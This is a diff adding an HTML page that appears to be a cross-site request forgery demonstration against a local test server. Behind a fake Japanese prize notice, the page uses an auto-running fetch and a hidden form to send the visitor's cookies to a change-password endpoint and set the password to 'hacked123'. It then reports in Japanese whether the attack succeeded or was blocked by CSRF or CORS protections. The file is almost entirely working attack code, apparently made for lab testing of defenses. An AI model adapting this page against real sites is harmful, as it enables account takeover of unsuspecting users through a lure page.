@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <title>当選おめでとうございます!</title>
+</head>
+<body>
+    <h1>おめでとうございます! 景品を受け取るにはこちらをクリック!</h1>
+    <p>読み込み中...</p>
+    <form action="http://localhost:8084/change-password" method="POST" id="exploit" style="display:none">
+        <input type="hidden" name="new_password" value="hacked123">
+    </form>
+    <script>
+        // Automatically submit the form to change the victim's password
+        fetch('http://localhost:8084/change-password', {
+            method: 'POST',
+            credentials: 'include',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ new_password: 'hacked123' })
+        }).then(r => {
+            if (r.ok) {
+                document.body.innerHTML = '<h1 style="color:red">攻撃成功! パスワードが「hacked123」に変更されました</h1>';
+            } else {
+                document.body.innerHTML = '<h1>攻撃失敗 (CSRF対策が有効)</h1>';
+            }
+        }).catch(() => {
+            document.body.innerHTML = '<h1>攻撃失敗 (CORSでブロックされた)</h1>';
+        });
+    </script>
+</body>
+</html>
